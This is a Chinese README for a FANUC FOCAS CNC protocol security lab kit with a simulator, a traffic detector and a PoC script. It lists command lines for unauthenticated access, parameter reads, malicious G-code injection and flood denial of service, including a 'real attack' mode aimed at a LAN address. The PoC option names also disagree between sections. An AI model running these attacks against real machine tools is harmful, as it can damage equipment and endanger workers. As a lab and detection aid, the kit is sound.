# FOCAS 协议 (FANUC Open CNC API System)

## 协议信息

| 属性 | 说明 |
|------|------|
| **排名** | 16 |
| **协议名称** | FOCAS (FOCAS1/FOCAS2) |
| **主要应用** | FANUC CNC 机床 |
| **传输层** | TCP / HSSB |
| **默认端口** | 8193 (TCP) |
| **重要性** | ★★★★ |

## 协议简介

FOCAS (FANUC Open CNC Application Programming Interface System) 是 FANUC 公司开发的 CNC 数据通信协议。通过 FOCAS 协议，上位机可读取CNC的各种状态数据（轴坐标、主轴转速、报警信息等），也可向CNC写入加工程序和修改参数。

FOCAS1 用于以太网通信，FOCAS2 用于 HSSB (高速串行总线) 通信。

## 文件说明

| 文件 | 说明 |
|------|------|
| `simulator.py` | FOCAS 协议模拟器 - 模拟 FANUC CNC FOCAS 服务 |
| `detector.py` | FOCAS 协议检测逻辑 - 识别和分析 FOCAS 流量 |
| `vuln_simulator.py` | 漏洞模拟器 - 模拟 FOCAS 常见安全漏洞 |
| `poc.py` | POC 代码 - FOCAS 漏洞利用验证 |
| `README.md` | 本说明文件 |

## 模拟器使用

```bash
# 启动 FOCAS 模拟器（监听 8193 端口）
python simulator.py

# 指定地址和端口
python simulator.py --host 0.0.0.0 --port 8193
```

## 检测器使用

```bash
# 分析 FOCAS 数据包
python detector.py
```

## 漏洞模拟器使用

```bash
# 默认模拟模式（不实际攻击）
python vuln_simulator.py --target 127.0.0.1

# 实际攻击模式
python vuln_simulator.py --target 192.168.1.100 --real
```

## POC 使用

```bash
# 认证绕过
python poc.py --target 192.168.1.100 --vuln auth_bypass

# 参数读取
python poc.py --target 192.168.1.100 --vuln read_param --param-addr 0x1000

# 程序注入
python poc.py --target 192.168.1.100 --vuln inject

# 拒绝服务
python poc.py --target 192.168.1.100 --vuln dos --dos-type flood

# 全部漏洞检测
python poc.py --target 192.168.1.100 --vuln all
```

## 已知漏洞

| 漏洞 | CVE | 严重程度 | 说明 |
|------|-----|----------|------|
| 认证绕过 | CVE-2017-16730 | 严重 | FOCAS 协议缺少认证机制 |
| 参数任意读取 | - | 高危 | 未授权读取 CNC 参数 |
| 参数任意写入 | - | 严重 | 未授权修改 CNC 参数 |
| 程序注入 | - | 严重 | 远程写入恶意 G-Code |
| 拒绝服务 | - | 高危 | 异常包导致服务崩溃 |

## POC 验证方法

### 前置条件
1. 启动 FOCAS 模拟器（模拟 CNC 服务器）：`python simulator.py`
2. 模拟器监听在 TCP 8193 端口

### 验证步骤

#### 1. CVE-2017-16730 未授权访问
```bash
python poc.py --target 127.0.0.1 --vuln unauthorized
```
**验证原理**：FOCAS 协议在 TCP 层无认证机制，直接发送 READ_SYSINFO(0x0100) 请求可获取 CNC 型号、版本、轴数信息。

**预期输出**：
```
[+] 成功: 无需认证即可读取 CNC 系统信息
CNC 型号: FANUC Series 0i-MODEL F
版本: 04.10
最大轴数: 5
```

#### 2. 轴坐标读取
```bash
python poc.py --target 127.0.0.1 --vuln axis
```
**预期输出**：显示 5 轴位置数据（X/Y/Z 及扩展轴），坐标值以毫米为单位。

#### 3. 动态数据读取
```bash
python poc.py --target 127.0.0.1 --vuln dynamic
```
**预期输出**：显示主轴转速（如 3001 RPM）、负载等动态运行数据。

#### 4. 运行状态读取
```bash
python poc.py --target 127.0.0.1 --vuln status
```
**预期输出**：显示 CNC 运行中/停止状态、报警状态。

#### 5. 报警信息读取
```bash
python poc.py --target 127.0.0.1 --vuln alarm
```
**预期输出**：返回报警码和报警描述信息。

#### 6. 全扫描（一次性验证所有漏洞）
```bash
python poc.py --target 127.0.0.1 --vuln all
```
**预期输出**：依次执行以上 5 项测试，末尾生成扫描报告，显示通过项数。

### 通过标准
- 模拟器正常运行，TCP 8193 端口可连接
- 各项 POC 均返回 `[+]` 标记的成功信息
- 检测器能正确识别 POC 构造的 FOCAS 请求帧

### 自动验证
```bash
python run_verify_all.py
```
脚本会自动启动模拟器 → 运行 POC → 停止模拟器 → 验证检测器。|
